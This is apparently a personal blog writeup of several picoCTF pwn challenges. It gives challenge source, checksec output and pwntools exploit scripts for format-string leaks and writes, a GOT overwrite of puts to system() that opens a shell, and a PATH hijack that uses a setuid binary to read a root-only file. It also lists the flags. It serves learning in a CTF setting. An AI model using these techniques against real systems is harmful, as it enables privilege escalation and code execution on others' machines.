---
title: '[Writeup] - Solving Pwn on PicoCTF'
tag: ['PWN', 'Writeup']
cover: /img/post/writeup/picoctf/thumbnail.png
category: ['Writeup']
date: 2025-8-17 00:14:35
author:
    - Vuk3r
---
Hi guys, this is series clear pwn from medium up to highest difficulty. I write these writeups mainly about the things I’ve learned, so some parts might be detailed while others are brief. Even so, they may still be useful to you if you read them. If you have any questions, free to ask me, Im free to share :>

# PIE TIME 2

## Description

```cpp
Author: Darkraicg492

Description
Can you try to get the flag? I'm not revealing anything anymore!!
Additional details will be available after launching your challenge instance.
```

## Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

Checksec

```cpp
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

## Attack analysis

My way is fast read all the code, so i can see vuln here, because printf need 2 parameter atleast to be safe, instead, it print the `buffer` value directly and it can has `format string` vulnerability

```c
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);
```

follow the root to find the branch, you can see `win()` function won’t be called in anywhere, so we have to call it by ourself.

And program flow is call `call_function()` to enter name, which has vuln `format string`. Then enter address to jump. So we can call `win()`

so we need `win()` address, but we got `PIE`, you can see it in `checksec`. It means address will be random.

The address will be calculated follow format : `base address + offset`

But as you know in code, random not really random, it needs some thing really random to calculate the random, like time. In binary we got `ASLR`, it’s make `base address` random with everytime we run, on each computer. In the other hands, it means offset is `permanent`

so if we can leak any address, we can calculate to base address, hence, we can know every address by know its offset.

In summary, we have a reverse road :

```c
enter win() address ← 
know win() address ←
know win’s offset and base address ← 
leak some address from binary
```

## Payload

```python
from pwn import *
import sys

if len(sys.argv) <= 2:
    p = process("./" + sys.argv[1])
    e = ELF("./" + sys.argv[1], checksec=False)

    gdb.attach(p,
'''
c
'''
)
else:
    remote_addr = sys.argv[1]
    remote_port = sys.argv[2]
    p = remote(remote_addr, int(remote_port))

context.log_level = 'DEBUG'
context.arch = 'amd64'

leak_to_base = 0x1441
win_to_base = 0x136a
p.sendlineafter(b'Enter your name:',b'%19$p')

leaked_address = int(p.recv(14),16)
base = leaked_address - leak_to_base
win = base + win_to_base

log.info('binary leaked : ' + hex(leaked_address))
log.info('base : ' + hex(base))
log.info('win : ' + hex(win))

payload = hex(win).encode()
p.sendlineafter(b'0x12345:',payload)
p.interactive()
```

flag : `picoCTF{p13_5h0u1dn'7_134k_bb903549}`

# hash-only-1-2

## Description

```cpp
Author: Junias Bonou

Description
Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!
Additional details will be available after launching your challenge instance.
```

## Source

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  __int64 v4; // rax
  const char *v5; // rax
  __int64 v6; // rdx
  __int64 v7; // rax
  __int64 v8; // rax
  int v9; // ebx
  char v11; // [rsp+Bh] [rbp-45h] BYREF
  unsigned int v12; // [rsp+Ch] [rbp-44h]
  _BYTE v13[40]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v14; // [rsp+38h] [rbp-18h]

  v14 = __readfsqword(0x28u);
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "Computing the MD5 hash of /root/flag.txt.... ", envp);
  v4 = std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
  sleep(2u);
  std::allocator<char>::allocator(&v11);
  std::string::basic_string(v13, "/bin/bash -c 'md5sum /root/flag.txt'", &v11);
  std::allocator<char>::~allocator(&v11);
  setgid(0);
  setuid(0);
  v5 = (const char *)std::string::c_str(v13);
  v12 = system(v5);
  if ( v12 )
  {
    v7 = std::operator<<<std::char_traits<char>>(&std::cerr, "Error: system() call returned non-zero value: ", v6);
    v8 = std::ostream::operator<<(v7, v12);
    std::ostream::operator<<(v8, &std::endl<char,std::char_traits<char>>);
    v9 = 1;
  }
  else
  {
    v9 = 0;
  }
  std::string::~string(v13);
  return v9;
}
```

## Attack analysis

*Before run the program, create `/root/flag.txt` to make sure it run the properly way.*

The program will execute the command :  `/bin/bash -c ‘md5sum /root/flag.txt’`

md5sum is a command to verify integrity of a file, but we will ignore it, because in this challenge we will tricked the system.

`md5sum` just a command like `ls`,`cd`,… are bash scripts too but why we don’t need full path to call it ? 

let’s create a bash script to see how its call will different from those command : 

```cpp
┌──(d4vicl㉿Device)-[/mnt/e/CTF/C_PWN/ctf_platform/picoCTF/medium_hash-only-1]
└─$ echo echo 'im in' > script

┌──(d4vicl㉿Device)-[/mnt/e/CTF/C_PWN/ctf_platform/picoCTF/medium_hash-only-1]
└─$ ./script
im in

┌──(d4vicl㉿Device)-[/mnt/e/CTF/C_PWN/ctf_platform/picoCTF/medium_hash-only-1]
└─$ script
Script started, output log file is 'typescript'.
┌──(d4vicl㉿Device)-[/mnt/e/CTF/C_PWN/ctf_platform/picoCTF/medium_hash-only-1]
└─$
```

hmmm… Why i can’t execute like `ls` or `md5sum` ? I have to put `./` in the head to run. So it means system doesn’t mean which command i want to execute ?

 Yes, exactly how it works. You should use the command

```cpp
echo $PATH
```

to see which path system know to execute, and when you call `ls` command, it will find in all the path listed in the above command, to locate `ls` 

```cpp
┌──(d4vicl㉿Device)-[/mnt/e/CTF/C_PWN/ctf_platform/picoCTF/medium_hash-only-1]
└─$ echo $PATH
/home/d4vicl/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/usr/games:...
```

```cpp
┌──(d4vicl㉿Device)-[/mnt/e/CTF/C_PWN/ctf_platform/picoCTF/medium_hash-only-1]
└─$ which ls
/usr/bin/ls
```

`‘which ls’` to show where `ls` locate, and when you read `$PATH`, you can see it has `/usr/bin` - the folder contain `ls` command.

so to run a program like this (the `script` is the file i created above)

```cpp
┌──(d4vicl㉿Device)-[/mnt/e/CTF/C_PWN/ctf_platform/picoCTF/medium_hash-only-1]
└─$ script
im in
```

you will need to use this command : 

```cpp
┌──(d4vicl㉿Device)-[/mnt/e/CTF/C_PWN/ctf_platform/picoCTF/medium_hash-only-1]
└─$ PATH=.:$PATH
```

PATH : is a enviroment variable name

 $PATH : is a value of PATH

so it means it will concate current directory (the place you’re standing) `.` to $PATH - which showed above. 

Hence, when you use any command, it will find in `.` - the current directory.

Specially, it will find command in `.` first, after that are all the directory listed in order left to right.

*So what if  exist two command with the same name but in different directory ? Which command will be executed ?* 

- the answer is the one when it found first, then the others which it can find.

So if we use

```cpp
 PATH=.:$PATH
```

 it will include `.` in head. That how we take advantage from it !
back to the program, it will call : 

```cpp
  std::string::basic_string(v13, "/bin/bash -c 'md5sum /root/flag.txt'", &v11);
  std::allocator<char>::~allocator(&v11);
  setgid(0);
  setuid(0);
  v5 = (const char *)std::string::c_str(v13);
  v12 = system(v5);
```

you can see it set `gid(0)` which means every group ID’s process will be `0` - root process

we don’t need to know if it set successfully or not, because if it return `0`, it means this file wil get `root` to run. 

`-1` means it already run in `root` (lol).

 so we don’t have root permission, to read `/root/flag.txt`, only need to fake md5sum to read. 

create a `md5sum` file with this content in current directory :

```cpp
cat /root/flag.txt
```

then, we could run `flaghasher` again to get flag.

with `hash-only-2` we will use `sh` command when ssh connected, then do the same to `hash-only-1`

 

flag 1: `picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_ae1d8678}`

flag 2: `picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_1a74f5fd}`

# format string 2

## Description

## Source

```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];

  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}

```

checksec

```cpp
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

## Attack analysis

You can see no PIE, so binary will be static address. 

With format string vulnerabiliy :

```cpp
  printf("Here's your input: ");
  printf(buf); //vuln
  printf("\n");
  fflush(stdout); 
```

Our goal is print the flag by trigger the condition : `sus == 0x67616c66`, and we know `sus`'s address because of no PIE.

So we know the `sus`'s address, value to trigger and format string, so we will use `%n` to write a value for `sus` 

Below here is shortest payload by using framework in pwntools.

## Payload

```python
from pwn import *
import sys

if len(sys.argv) <= 2:
    p = process("./" + sys.argv[1])
    e = ELF("./" + sys.argv[1], checksec=False)

else:
    remote_addr = sys.argv[1]
    remote_port = sys.argv[2]
    p = remote(remote_addr, int(remote_port))

context.log_level = 'DEBUG'
context.arch = 'amd64'

sus = 0x404060 # goal : sus = 0x67616c66

payload = fmtstr_payload(14,{sus : 0x67616c66})

p.sendlineafter(b'What do you have to say?\n', payload)

p.interactive()
```

handcraft payload: 

```python
from pwn import *
import sys

if len(sys.argv) <= 2:
    p = process("./" + sys.argv[1])
    e = ELF("./" + sys.argv[1], checksec=False)

else:
    remote_addr = sys.argv[1]
    remote_port = sys.argv[2]
    p = remote(remote_addr, int(remote_port))

context.log_level = 'DEBUG'
context.arch = 'amd64'

sus = 0x404060 # goal : sus = 0x6761 6c66

payload = f'%{0x6761}c%24$hn'.encode()
payload += f'%{0x6c66-0x6761}c%25$hn'.encode()
payload = payload.ljust(0x50,b'a')
payload += p64(sus+2)
payload += p64(sus)
p.sendlineafter(b'What do you have to say?\n', payload)

p.interactive()
```

explain : 

`fmtstr_payload()` : from pwntools

`14` : offset when your input entry

`{sus : 0x67616c66}` : sus is address we want to write value, and `0x67616c66` is that value

flag : `picoCTF{f0rm47_57r?_f0rm47_m3m_741fa290}`

# format string 3

## Description

```cpp
Author: SkrubLawd

Description
This program doesn't contain a win function. How can you win?
Download the binary here.
Download the source here.
Download libc here, download the interpreter here. Run the binary with these two files present in the same directory.
Additional details will be available after launching your challenge instance.
```

## Source

All the file we got : 

- binary
- source
- libc
- interpreter

Checksec : 

```cpp
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x3ff000)
RUNPATH:    b'.'
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

## Attack analysis

Remember always patch binary with libc whenever you receive libc, I use `pwninit` to patch the libc.

Go around and we can’t see how to get shell or read flag, besides we get libc with different current version, so we need to `ret2libc`

In libc always has `system()` function, the goal maybe call command  `system("/bin/sh")`

because of lacking of condition : return to system() + rdi is a pointer to  `"/bin/sh"` string, i look around and see `puts` is holding that condition: 

```cpp
	puts(normal_string);
```

`normal_string` is `"/bin/sh"` has been declared. But what’s wrong with `puts` ? 

you can see this : 

```cpp
RELRO:      Partial RELRO
```

it means got doesn’t `GOT` protection, so I think we can attack `GOT`. Bonus with no PIE it means GOT’s address will be static. Reverse our road we got : 

```cpp
call system("/bin/sh") <-
attack puts's GOT to system() address <-
format string to write into puts's GOT value
```

## Payload

```python
from pwn import *
import sys

if len(sys.argv) <= 2:
    p = process("./" + sys.argv[1])
    e = ELF("./" + sys.argv[1], checksec=False)

    gdb.attach(p,
'''
b*main+145
c
'''
)
else:
    remote_addr = sys.argv[1]
    remote_port = sys.argv[2]
    p = remote(remote_addr, int(remote_port))

context.log_level = 'DEBUG'
context.arch = 'amd64'

got_put = 0x404018
system_to_base = 0x4f760
leak_to_base = 0x7a3f0
payload = p64(got_put)

p.recvuntil(b'in libc: ')
libc_leaked = int(p.recv(14),16)
base = libc_leaked - leak_to_base
system = base + system_to_base
system_tail = system & 0xffffff
log.info('libc base : ' + hex(base))
log.info('system : ' + hex(system))
log.info('system tail : ' + hex(system_tail))

payload = fmtstr_payload(38,{got_put : system})

p.sendline(payload)

p.sendline(b'ls')
p.sendline(b'cat flag.txt')
p.interactive()
```

handcraft payload : 

```python
from pwn import *
import sys

if len(sys.argv) <= 2:
    p = process("./" + sys.argv[1])
    e = ELF("./" + sys.argv[1], checksec=False)

    gdb.attach(p,
'''
b*main+145
c
'''
)
else:
    remote_addr = sys.argv[1]
    remote_port = sys.argv[2]
    p = remote(remote_addr, int(remote_port))

context.log_level = 'DEBUG'
context.arch = 'amd64'

got_put = 0x404018
system_to_base = 0x4f760
leak_to_base = 0x7a3f0
payload = p64(got_put)

p.recvuntil(b'in libc: ')
libc_leaked = int(p.recv(14),16)
base = libc_leaked - leak_to_base
system = base + system_to_base
system_tail = system & 0xffffff
log.info('libc base : ' + hex(base))
log.info('system : ' + hex(system))
log.info('system tail : ' + hex(system_tail))

payload = f'%{system_tail&0xff}c%42$hhn'.encode()
payload += f'%{(system_tail>>8)-(system_tail&0xff)}c%43$hn'.encode()
payload = payload.ljust(32,b'a')

payload += p64(got_put)
payload += p64(got_put+1)
p.sendline(payload)

p.sendline(b'ls')
p.sendline(b'cat flag.txt')
p.interactive()
```

flag : `picoCTF{G07_G07?_cf6cb591}`